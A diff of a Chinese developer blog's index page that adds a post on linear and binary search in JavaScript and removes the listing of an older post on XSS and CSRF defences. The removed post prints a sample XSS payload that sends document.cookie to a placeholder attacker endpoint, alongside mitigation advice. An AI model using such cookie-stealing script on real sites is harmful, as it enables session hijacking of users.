@@ -266,6 +266,139 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://zain.red/blog/blog/2017/12/11/八大排序三大查找JavaScript实现之二：顺序查找，二分查找/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Zain King">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://static.zain.red/11.25/avatar.svg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zain.red">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/blog/2017/12/11/八大排序三大查找JavaScript实现之二：顺序查找，二分查找/" itemprop="url">八大排序三大查找JavaScript实现之二：线性查找，二分查找</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-11T18:09:37+08:00">
+                2017-12-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>这是我“八大排序三大查找JavaScript实现”系列文章的第二篇，转载请注明来源。<br>所有排序算法针对顺序存储结构，以升序方式排列；三大查找算法不涉及动态查找（查找树与平衡查找树等）的知识。<br>文章算法仅供参考复习数据结构与算法之用，实际工程推荐使用使用Array.prototype.sort()函数和Array.prototype.indexOf()函数</p>
+</blockquote>
+<h2 id="线性查找"><a href="#线性查找" class="headerlink" title="线性查找"></a>线性查找</h2><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><ul>
+<li>时间复杂度：O(n)</li>
+</ul>
+<h3 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h3><p>从第一个记录开始，逐个比较记录的关键字，直到和给定的K值相等，则查找成功；若比较结果与文件中n个记录的关键字都不等，则查找失败。</p>
+<h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">linear_search</span> (<span class="params">keyword, array</span>) </span>&#123;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; array.length;i++) &#123;</div><div class="line">    <span class="keyword">if</span> (array[i] === keyword) &#123;</div><div class="line">      <span class="keyword">return</span> i;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">arr = [<span class="number">6</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">8</span>];</div><div class="line"><span class="keyword">var</span> result = linear_search(<span class="number">3</span>, arr);</div><div class="line"><span class="built_in">console</span>.log(result); <span class="comment">//5</span></div></pre></td></tr></table></figure>
+<h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><h3 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><ul>
+<li>时间复杂度：O(logn)</li>
+</ul>
+<h3 id="算法描述-1"><a href="#算法描述-1" class="headerlink" title="算法描述"></a>算法描述</h3><p>对于升序序列查找所要查找的元素时,首先与序列中间的元素进行比较,如果大于这个元素,就在当前序列的后半部分继续查找,如果小于这个元素,就在当前序列的前半部分继续查找,直到找到相同的元素,或者所查找的序列范围为空为止。（降序亦然）</p>
+<h3 id="递归实现"><a href="#递归实现" class="headerlink" title="递归实现"></a>递归实现</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">bisect_search</span> (<span class="params">keyword, array, left, right</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> start = left || <span class="number">0</span>, end = right || array.length - <span class="number">1</span>;</div><div class="line">  <span class="keyword">var</span> mid = <span class="built_in">Math</span>.floor((end - start) / <span class="number">2</span>) + start;  </div><div class="line">  <span class="keyword">if</span> (array[mid] === keyword) &#123;  </div><div class="line">      <span class="keyword">return</span> mid;  </div><div class="line">  &#125;  </div><div class="line">  <span class="keyword">if</span> (start &gt;= end) &#123;  </div><div class="line">      <span class="keyword">return</span> <span class="number">-1</span>;  </div><div class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyword &gt; array[mid]) &#123;  </div><div class="line">      <span class="keyword">return</span> bisect_search(keyword, array, mid + <span class="number">1</span>, end);  </div><div class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyword &lt; array[mid]) &#123;  </div><div class="line">      <span class="keyword">return</span> bisect_search(keyword, array, start, mid - <span class="number">1</span>);  </div><div class="line">  &#125;  </div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;  </div><div class="line">&#125;</div><div class="line"></div><div class="line">arr = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</div><div class="line"><span class="keyword">var</span> result = bisect_search(<span class="number">3</span>, arr);</div><div class="line"><span class="built_in">console</span>.log(result); <span class="comment">//3</span></div></pre></td></tr></table></figure>
+<h3 id="非递归实现"><a href="#非递归实现" class="headerlink" title="非递归实现"></a>非递归实现</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">bisect_search</span> (<span class="params">keyword, array</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> mid = array.length / <span class="number">2</span>;  </div><div class="line">  <span class="keyword">if</span> (keyword === array[mid]) &#123;  </div><div class="line">      <span class="keyword">return</span> mid;  </div><div class="line">  &#125;  </div><div class="line">  <span class="keyword">var</span> start = <span class="number">0</span>;  </div><div class="line">  <span class="keyword">var</span> end = array.length - <span class="number">1</span>;  </div><div class="line">  <span class="keyword">while</span> (start &lt;= end) &#123;  </div><div class="line">    mid = <span class="built_in">Math</span>.floor((end - start) / <span class="number">2</span>) + start;  </div><div class="line">    <span class="keyword">if</span> (keyword &lt; array[mid]) &#123;  </div><div class="line">        end = mid - <span class="number">1</span>;  </div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyword &gt; array[mid]) &#123;  </div><div class="line">        start = mid + <span class="number">1</span>;  </div><div class="line">    &#125; <span class="keyword">else</span> &#123;  </div><div class="line">        <span class="keyword">return</span> mid;  </div><div class="line">    &#125;  </div><div class="line">  &#125;  </div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">arr = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</div><div class="line"><span class="keyword">var</span> result = bisect_search(<span class="number">3</span>, arr);</div><div class="line"><span class="built_in">console</span>.log(result); <span class="comment">//3</span></div></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://zain.red/blog/blog/2017/12/11/八大排序三大查找JavaScript实现之一：冒泡排序，选择排序，直接插入排序/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -548,139 +681,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://zain.red/blog/blog/2017/11/27/前端安全：XSS与CSRF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Zain King">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://static.zain.red/11.25/avatar.svg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Zain.red">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/blog/2017/11/27/前端安全：XSS与CSRF/" itemprop="url">前端安全：XSS与CSRF</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-27T09:32:10+08:00">
-                2017-11-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="XSS的原理和防范方式"><a href="#XSS的原理和防范方式" class="headerlink" title="XSS的原理和防范方式"></a>XSS的原理和防范方式</h2><p>XSS全称Cross Site Scripting（为啥不叫CSS？为了和层叠样式表Cascading Style Sheets区分），即跨站脚本攻击。<br>定义 恶意用户 是实行XSS攻击的人，恶意代码 是指含有某些可执行恶意前端脚本的代码，目标用户 是指受到XSS攻击的人。<br>恶意用户将恶意脚本装作普通文本的样式上传到服务器，这些文本将被渲染到目标用户的页面上，从而被执行，这样的流程称之为‘跨站脚本攻击’。<br>举例：有一个发表评论的功能，一个人发表了评论大家就都能看见，于是恶意用户就在这个评论区发表了以下代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">request.open(<span class="string">'POST'</span>, <span class="string">'/攻击者自家的收集数据的接口'</span>, <span class="literal">true</span>);</div><div class="line">request.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>);</div><div class="line">request.send(<span class="built_in">document</span>.cookie);</div></pre></td></tr></table></figure><br>如果这个代码未经过滤直接执行，那么攻击者将会收集所有访问这个评论区的用户的cookie以便执行只有目标用户才有权限做的事情。<br>作为网站建设方，我们通常可以采取以下手段来防止XSS攻击：</p>
-<ol>
-<li>转义 &lt; &gt; 这些特殊字符为实体字符</li>
-<li>利用正则判断攻击脚本</li>
-<li>尽量修改节点文本而不是修改节点内容html</li>
-</ol>
-<p>事实上，现代模板引擎和MVVM框架往往都自带防御XSS攻击的模板写法。<br>例如在ng2、Vue和handlebars.js里，双花括号表示自动过滤，三花括号才表示不经转义直接输出。</p>
-<h2 id="CSRF的原理和防范方式"><a href="#CSRF的原理和防范方式" class="headerlink" title="CSRF的原理和防范方式"></a>CSRF的原理和防范方式</h2><p>CSRF全称Cross-site request forgery（跨站请求伪造）是指恶意用户将某些需要他人权限的接口埋藏在自己的脚本中，将脚本利用XSS相同的注入方式或诱导用户点击执行等方式令拥有权限者执行，从而达到自己的目的。<br>例如，恶意用户想要给某个人刷票，而一个微信号只能投一张票，他发现了刷票的接口为A，则将对A进行Ajax请求的XSS脚本注入某网站（方法1）,或者利用像色情等吸引眼球的方法（方法2）将此段脚本内嵌入自己写的网页中诱使他人点击，从而实现不断有有效用户访问这个接口的目的。<br>作为网站建设方，我们通常可以使用以下手段来防止CSRF攻击：</p>
-<ol>
-<li>尽量对要修改数据的请求使用post而不是get</li>
-<li>给每一次用户登陆分配一个临时token，用服务端的setCookie头将此token种入用户cookie中，每次请求比对用户方token与服务器端token是否吻合。</li>
-<li>服务器禁止跨域请求</li>
-<li>及时清除用户的无效cookie</li>
-</ol>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -731,7 +731,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/blog/archives/">
-                <span class="site-state-item-count">38</span>
+                <span class="site-state-item-count">39</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
